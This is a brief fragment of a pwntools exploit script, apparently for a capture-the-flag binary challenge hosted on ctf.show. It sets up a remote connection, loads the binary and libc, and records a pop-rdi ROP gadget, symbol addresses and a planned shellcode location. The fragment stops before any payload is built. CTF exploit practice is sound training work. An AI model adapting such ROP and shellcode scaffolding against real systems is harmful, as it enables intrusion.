from pwn import *
context(arch = 'amd64',os = 'linux',log_level = 'debug')
#io = process('./pwn')
io = remote('pwn.challenge.ctf.show',28127)
elf = ELF('./pwn')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
pop_rdi_ret = 0x00000000004007e3  # 0x00000000004007e3 : pop rdi ; ret
ctfshow = elf.sym['ctfshow']
bss_start_addr = 0x601000
main = elf.sym['main']
shellcode_addr = 0x602000 - 0x100
